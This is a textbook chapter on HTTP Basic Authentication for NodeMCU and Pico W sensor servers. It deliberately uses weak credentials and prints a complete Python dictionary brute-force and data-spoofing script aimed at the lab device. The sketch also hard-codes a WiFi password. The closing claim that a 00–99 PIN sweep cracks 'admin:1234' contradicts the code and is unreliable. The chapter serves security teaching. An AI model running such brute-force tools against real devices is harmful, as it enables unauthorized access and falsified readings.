% ==========================================
% CHAPTER 05: Level 7 (Basic Auth)
% ==========================================
\chapter{Level 7: HTTP Basic Authentication}

\textbf{In This Chapter:}
\begin{itemize}
    \item Deploying the `Authorization: Basic` HTTP Header.
    \item Base64 encoding mathematics explicitly revealed.
    \item Executing NodeMCU Level 7 and Pico W `04\_weak\_login`.
    \item Deploying the catastrophic Python Dictionary Brute-Force (`04\_attack.py`).
\end{itemize}

To immediately patch the vulnerability demonstrated in Level 6, we seal the endpoint using HTTP Basic Authentication (Defined globally in RFC 7617: \url{https://datatracker.ietf.org/doc/html/rfc7617}). 

\section{The Mechanics of Basic Auth}
When a user navigates to a secured endpoint, the server rejects them using status code `401 Unauthorized`. It also transmits the header `WWW-Authenticate: Basic`. The browser intercepts this header, halts the HTML engine, and generates a native login popup window.

When the user clicks "Submit", the browser merges the username and password, separated by a colon (e.g., `admin:1234`). It then runs this string through a \textbf{Base64 Encoding Algorithm}. 

Base64 is a binary-to-text encoding scheme. It translates the string into a globally printable ASCII format. `admin:1234` mathematically converts to `YWRtaW46MTIzNA==`. The browser transmits this string back to the server:
\texttt{Authorization: Basic YWRtaW46MTIzNA==}

\begin{troubleshootbox}[Base64 is NOT Encryption!]
Base64 utilizes NO cryptographic keys! It is merely a translation alphabet. Any attacker sniffing the Wi-Fi packet can capture `YWRtaW46MTIzNA==` and reverse it back into `admin:1234` instantly. Never use Basic Auth exclusively over non-TLS (HTTP) networks for safety-critical architecture.
\end{troubleshootbox}

% -------------------------
% NodeMCU
% -------------------------
\section{Systematic NodeMCU Implementation (Level 7)}
The Arduino C++ ecosystem makes this incredibly streamlined. We restrict the override capability utilizing `server.authenticate()`. Unabridged code below:

\begin{lstlisting}[language=C++, caption=23022026\_Level\_7\_IoT\_Secure\_Override\_Demo.ino]
/*
  IoT Security Demo – Password Protected Override
  ------------------------------------------------
  Board: NodeMCU (ESP8266)
  Sensor: DHT22

  PURPOSE:
  1. Show real temperature & humidity by default.
  2. Allow override using URL parameters (?t= & ?h=).
  3. Require username & password before allowing override.
  4. Fake values remain until reboot.

  HOW TO TEST:

  Normal:
    http://YOUR_IP

  Override (Browser):
    http://YOUR_IP/?t=100&h=5
    → Browser will ask Username & Password

  Override (CMD):
    curl -u admin:1234 "http://YOUR_IP/?t=80&h=10"

  NOTE:
  This uses Basic Authentication over HTTP.
  Password is NOT encrypted (educational demo only).
*/

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DHT.h>

#define D5PIN D5
#define DHTTYPE DHT22

// ---------------- WIFI CONFIG ----------------
const char* ssid = "drarka.in";            // Your WiFi Name
const char* pass = "arkaprabha@1985";      // Your WiFi Password

// ---------------- ADMIN LOGIN ----------------
const char* adminUser = "admin";           // Username for override
const char* adminPass = "1234";            // Password for override

// ---------------- OBJECTS ----------------
DHT dht(D5PIN, DHTTYPE);
ESP8266WebServer server(80);

// ---------------- OVERRIDE STORAGE ----------------
float overrideTemp = NAN;
float overrideHum  = NAN;

void setup() {

  Serial.begin(9600);       // Start Serial Monitor
  dht.begin();              // Start DHT sensor

  WiFi.begin(ssid, pass);   // Connect to WiFi
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
  }

  Serial.println("Connected!");
  Serial.print("Open this IP in browser: ");
  Serial.println(WiFi.localIP());

  // ---------------- WEB SERVER ----------------
  server.on("/", []() {

    // Step 1: If user tries to override values...
    if (server.hasArg("t") || server.hasArg("h")) {

      // Step 2: Ask for authentication against the memory variables
      if (!server.authenticate(adminUser, adminPass)) {
        return server.requestAuthentication(); // Throws 401 Header
      }

      // Step 3: If login successful → store override safely
      if (server.hasArg("t")) overrideTemp = server.arg("t").toFloat();
      if (server.hasArg("h")) overrideHum  = server.arg("h").toFloat();

      Serial.println("Override authorized!");
    }

    // Read real sensor values
    float t = dht.readTemperature();
    float h = dht.readHumidity();

    // Replace with override if exists
    if (!isnan(overrideTemp)) t = overrideTemp;
    if (!isnan(overrideHum))  h = overrideHum;

    // -------- HTML PAGE --------
    String page = "<html>";
    page += "<head><meta http-equiv='refresh' content='5'></head>";
    page += "<body bgcolor='black' text='white'><center>";

    page += "<h1>Temperature</h1>";
    page += "<h1><font color='cyan'>" + String(t) + " C</font></h1>";

    page += "<h1>Humidity</h1>";
    page += "<h1><font color='pink'>" + String(h) + " %</font></h1>";

    page += "</center></body></html>";

    server.send(200, "text/html", page);
  });

  server.begin();  // Start server
}

void loop() {
  server.handleClient();  // Keep server running
}
\end{lstlisting}

% -------------------------
% Pico W 04
% -------------------------
\section{Systematic Pico W Implementation (04\_Weak\_Login)}
In MicroPython, lacking the high-level web server class libraries, we pre-calculate the Base64 value manually using the \texttt{ubinascii} library, and parse the socket strings looking for a literal substring match.

\begin{lstlisting}[language=Python, caption=04\_weak\_login.py]
import network
import socket
import time
import machine
import dht
import ubinascii
import secrets

# -------------------------
# Sensor Setup
# -------------------------
sensor = dht.DHT22(machine.Pin(15))

# -------------------------
# WiFi Connection
# -------------------------
wlan = network.WLAN(network.STA_IF)
wlan.active(True)
wlan.connect(secrets.SSID, secrets.PASSWORD)

print("Connecting to WiFi...")
while not wlan.isconnected():
    time.sleep(1)

ip = wlan.ifconfig()[0]
print("Connected! IP:", ip)

# -------------------------
# Authentication Setup
# -------------------------
# Step 1: Base64 Translation Execution
auth = ubinascii.b2a_base64(
    f"{secrets.WEB_USER}:{secrets.WEB_PASS}".encode()
).strip().decode()

expected = f"Basic {auth}"

# -------------------------
# Socket Setup
# -------------------------
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 80))
s.listen(5)
s.settimeout(1.0)   # Prevents freezing

# -------------------------
# Variables
# -------------------------
t, h = "0.0", "0.0"
spoof_active = False

print("Server running...")

# -------------------------
# Main Loop
# -------------------------
try:
    while True:

        # Update real sensor data
        if not spoof_active:
            try:
                sensor.measure()
                t = "{:.1f}".format(sensor.temperature())
                h = "{:.1f}".format(sensor.humidity())
            except:
                pass

        conn = None

        try:
            conn, addr = s.accept()
            conn.settimeout(1.0)

            raw_req = conn.recv(1024)
            if not raw_req:
                conn.close()
                continue

            req = raw_req.decode()

            # -------------------------
            # AUTH CHECK
            # -------------------------
            # Step 2: Does the browser string contain our exact Base64 match?
            if expected in req:

                # Spoof Sensor
                if '/set_env?' in req:
                    try:
                        query = req.split('?')[1].split(' ')[0]
                        parts = query.split('&')
                        for p in parts:
                            if p.startswith('t='):
                                t = p.split('=')[1]
                            if p.startswith('h='):
                                h = p.split('=')[1]
                        spoof_active = True
                    except:
                        pass

                # Reset
                if '/reset' in req:
                    spoof_active = False

                # -------------------------
                # HTML UI
                # -------------------------
                html = f"""<!DOCTYPE html>
<html>
<head>
<title>Pico Secure Monitor</title>
<meta http-equiv="refresh" content="2">
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {{
    background-color: #121212;
    font-family: sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}}
.card {{
    background-color: #1e1e1e;
    padding: 2rem;
    border-radius: 1rem;
    box-shadow: 0 4px 15px rgba(0,0,0,0.5);
    text-align: center;
    width: 320px;
}}
.temp {{
    color: cyan;
    font-size: 2.5rem;
    font-weight: bold;
}}
.hum {{
    color: pink;
    font-size: 2.5rem;
    font-weight: bold;
}}
.label {{
    color: #888;
    font-size: 0.8rem;
    text-transform: uppercase;
    letter-spacing: 1px;
}}
.status {{
    margin-top: 1rem;
    color: orange;
    font-size: 0.9rem;
}}
button {{
    margin-top: 1rem;
    padding: 8px 15px;
    border: none;
    border-radius: 6px;
    background: #333;
    color: white;
}}
</style>
</head>
<body>
<div class="card">
    <div class="label">Temperature</div>
    <div class="temp">{t} &deg;C</div>
    <div class="label">Humidity</div>
    <div class="hum">{h} %</div>

    <div class="status">
        {"SPOOF MODE ACTIVE" if spoof_active else "LIVE SENSOR DATA"}
    </div>

    <a href="/reset"><button>Reset</button></a>
</div>
</body>
</html>"""

                conn.send('HTTP/1.0 200 OK\r\nContent-type: text/html\r\n\r\n')
                conn.sendall(html)

            else:
                # Step 3: Hard Socket Rejection logic
                conn.send('HTTP/1.0 401 Unauthorized\r\n')
                conn.send('WWW-Authenticate: Basic realm="Restricted"\r\n\r\n')
                conn.send('<h1>401 Unauthorized</h1>')

            conn.close()

        except OSError:
            time.sleep(0.1)

        except Exception:
            if conn:
                conn.close()

        time.sleep(0.1)

except KeyboardInterrupt:
    print("Server Stopped")
    s.close()
\end{lstlisting}

% -------------------------
% ATTACK SCRIPT
% -------------------------
\section{The Brute-Force Exploit (Python Dictionary Protocol)}

Congratulations. The Python Hack script from Chapter 4 reliably crashes violently against the `401 Unauthorized` wall. However, our device is still functionally compromised. By utilizing a "Weak" PIN code mechanism, an attacker upgrades their logic from blind opportunism to targeted \textbf{Dictionary Aggregation}.

By running the `04\_attack.py` script on the attacking laptop, the script sequentially builds native Base64 payloads (e.g., `test\_auth`) and slams them repeatedly against the Pico's port 80. Note the specific inclusion of `time.sleep(1)` inside the attack script: this is not an artificial delay to be nice. If the attacker hurled strings too fast, the Pico's weak processor halts under a Denial-of-Service freeze, making the attack fail! A skilled attacker paces their attack precisely to match the hardware execution speed of their victim.

\begin{lstlisting}[language=Python, caption=04\_attack.py]
import urllib.request
import urllib.error
import sys
import time
import base64

# --- Configuration ---
print("--- PICO ULTIMATE EXPLOIT TOOL ---")
target_ip = input("Enter Pico IP (e.g., 192.168.1.50): ")
username = input("Enter Username to target: ")

def test_auth(ip, user, pwd):
    """Tests a single password and returns the auth_str if successful."""
    creds = f"{user}:{pwd}"
    auth_str = base64.b64encode(creds.encode()).decode()
    headers = {
        "Authorization": f"Basic {auth_str}",
        "Connection": "close"  # Crucial for Pico stability
    }
    url = f"http://{ip}/"
    
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=3) as response:
            if response.status == 200:
                return auth_str
    except urllib.error.HTTPError as e:
        if e.code == 401:
            return None # Wrong password
    except Exception:
        return "RETRY" # Pico is likely busy or timed out
    return None

# --- Phase 1: Authentication ---
found_auth = None
mode = input("Do you know the password? (y/n): ").lower()

if mode == 'y':
    pwd = input("Enter known password: ")
    print("[*] Verifying...")
    found_auth = test_auth(target_ip, username, pwd)
    if not found_auth:
        print("[-] Incorrect. Switching to Brute Force...")
        mode = 'n'

if mode == 'n':
    print(f"[*] Starting Brute Force (00-99) for '{username}'...")
    for i in range(100):
        # Format string integer injection
        pwd = f"{i:02d}"  # Formats as 00, 01, 02...
        sys.stdout.write(f"\r[*] Testing PIN: {pwd} ")
        sys.stdout.flush()
        
        result = test_auth(target_ip, username, pwd)
        
        if result == "RETRY":
            # Pico is overwhelmed, wait a second and try the same number again
            time.sleep(1)
            result = test_auth(target_ip, username, pwd)

        if result and result != "RETRY":
            print(f"\n[+] SUCCESS! Password found: {pwd}")
            found_auth = result
            break
        
        # Small delay to prevent the Pico's network stack from crashing
        time.sleep(0.1)

# --- Phase 2: Exploit Menu ---
if found_auth:
    headers = {"Authorization": f"Basic {found_auth}", "Connection": "close"}
    while True:
        print("\n" + "="*20)
        print(" ACCESS GRANTED ")
        print("="*20)
        print("1. SPOOF DATA (T=99.9, H=99.9)")
        print("2. CUSTOM OVERRIDE")
        print("3. RESET SYSTEM")
        print("4. EXIT")
        
        choice = input("\nSelect Option: ")
        
        path = ""
        if choice == "1":
            path = "/set_env?t=99.9&h=99.9"
        elif choice == "2":
            t = input("Enter Temp: ")
            h = input("Enter Humid: ")
            path = f"/set_env?t={t}&h={h}"
        elif choice == "3":
            path = "/reset"
        elif choice == "4":
            break
        
        if path:
            try:
                req = urllib.request.Request(f"http://{target_ip}{path}", headers=headers)
                urllib.request.urlopen(req, timeout=3)
                print("[+] Command sent successfully!")
            except Exception as e:
                print(f"[!] Command failed: {e}")
else:
    print("\n[-] Attack finished. No access gained.")
\end{lstlisting}

This algorithm completely obliterates the Level 7 NodeMCU and the 04 Pico defenses. In less than ten seconds, the device will yield to `admin:1234` or whatever weak numerical boundary the user has established. We must proceed to Lockouts.
